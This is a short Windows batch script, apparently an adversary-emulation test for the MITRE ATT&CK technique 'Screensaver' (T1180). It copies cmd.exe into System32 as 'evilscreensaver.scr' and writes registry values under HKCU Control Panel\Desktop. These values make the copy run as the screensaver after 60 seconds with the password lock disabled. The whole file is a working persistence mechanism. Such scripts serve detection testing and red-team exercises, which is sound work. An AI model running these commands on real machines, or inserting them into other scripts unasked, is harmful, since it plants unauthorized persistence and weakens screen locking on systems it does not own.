@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique:  Screensaver  (T1180)
ECHO.
ECHO [+] Achieve Persistence using Screensaver Registry Entries
ECHO 	- HKEY_CURRENT_USER\Control Panel\Desktop
ECHO -------------------------------------------------------------------
copy C:\Windows\System32\cmd.exe "%SystemRoot%\System32\evilscreensaver.scr"
cmd /c reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
cmd /c reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverTimeout /t REG_SZ /d 60 /f
cmd /c reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
cmd /c reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
ECHO. 


